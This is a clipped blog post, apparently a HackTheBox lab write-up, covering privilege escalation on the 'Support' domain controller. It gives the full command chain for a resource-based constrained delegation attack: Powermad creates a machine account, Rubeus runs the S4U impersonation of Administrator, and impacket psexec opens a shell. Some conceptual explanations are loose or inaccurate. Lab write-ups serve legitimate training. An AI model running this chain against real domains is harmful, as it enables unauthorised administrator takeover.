---
title: "goosie's dump"
source: "https://volery.org/Blog/HackTheBox/Support/Support"
author:
published:
created: 2025-06-23
description:
tags:
  - "clippings"
---
## Privilege Escalation

So we have a shell, but what now? I started off running the usual `winPEAS` in the background and focusing on getting `BloodHound` up, since this is a "easy" rated domain controller. Knowing HTB this was where to look.

### BloodHound

We are a part of the `SHARED SUPPORT ACCOUNTS` group, which has the GenericAll privilege on the domain controller. According to BloodHound, this is a privilege escalation vector that may be abused. ![](https://volery.org/pics/htb-support/bh.png)

#### Resource-Based Constraint Delegation

Resource-Based Constraint Delegation is a feature in Active Directory that allows administrators to specify which users or groups are allowed to delegate their permissions to other users or groups. This can be useful in situations where a user needs to perform a task that requires permissions that they do not have, but a user with the necessary permissions trusts them to perform the task on their behalf. For example, an administrator may allow a group of IT technicians to delegate their permissions to reset user passwords, as long as the request is made by a member of the HR department.

#### S4UProxy

S4UProxy is a feature in Active Directory that allows a user to obtain a service ticket for a different user without knowing their password. This feature is typically used in situations where a service account needs to access a resource on behalf of a user, but the service account is not trusted to know the user's password. S4USelf works in a very similar way, allowing a user to obtain a ticket for itself. In a S4UProxy attack, an attacker exploits this feature to obtain a service ticket for a high-privileged account, such as an administrator account, without knowing the password for the account. The attacker can then use the service ticket to access resources and perform actions that are normally restricted to the high-privileged account.

### Chaining it together

First, we leverage [powermad](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1) to create a new machine account using our `GenericAll` privileges on the domain.

```
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

Now we set the `PrincipalsAllowedToDelegateToAccount` to allow for `SERVICEA` to impersonate any user against our target `DC`

```
Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount SERVICEA$
Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount
```

Next, we use `Rubeus` to get a hash of our password. In a second step, we perform a the actual `S4U` attack, which can be done with Rubeus as well. Please note that this step abuses intended functionality, and requires the above mentioned misconfigurations to be present. In this case we have `GenericAll` or any other write privileges on the target machine, which allowed us to misconfigure the rest ourselves.

```
.\Rubeus.exe hash /password:123456 /user:SERVICEA$ /domain:support.htb

.\rubeus.exe s4u /user:SERVICEA$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /domain:support.htb  /ptt
```

This is the basic attack, but more work is needed to login, as the ticket is injected into memory by `Rubeus` and usually intended to use immediately within a multi-machine environment. Grab the ticket and format it, then convert it to a usable ticket for impacket.

```
echo <ticket> | base64 -d > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
```

Now we can use impacket psexec to login:

```
psexec.py -k -no-pass support.htb/Administrator@dc.support.htb -dc-ip 10.10.11.174 -target-ip 10.10.11.174
```

## Closing Thoughts

- I enjoyed this machine very much, since it depended a lot on external LDAP enumeration which always tickles me out of pure principle.
- AD/LDAP are far from easy to get a handle on, even if the basics are understood. I think getting a good grasp on this and being able to navigate LDAP with confidence is a must in the age of Active Directory (and Azure).
- I used some different tools as well to explore further; and figured this would be the time to explore Apache Directory Studio a bit. I don't think it's more convenient for this purpose, but clicking through everything definitely further enhanced my confidence in my `ldapsearch` queries.
- The privilege escalation took a second to find through BloodHound, but same deal here. I feel that it is of immense importance to know what to click, since it is a powerful tool but only as powerful as the attacker itself.
- Huge thanks to the creator of this machine (0xdf) and HackTheBox for providing cool content, and Carlos Polop ([hacktricks](https://volery.org/Blog/HackTheBox/Support/book.hacktricks.xyz)) for saving my ass yet again:D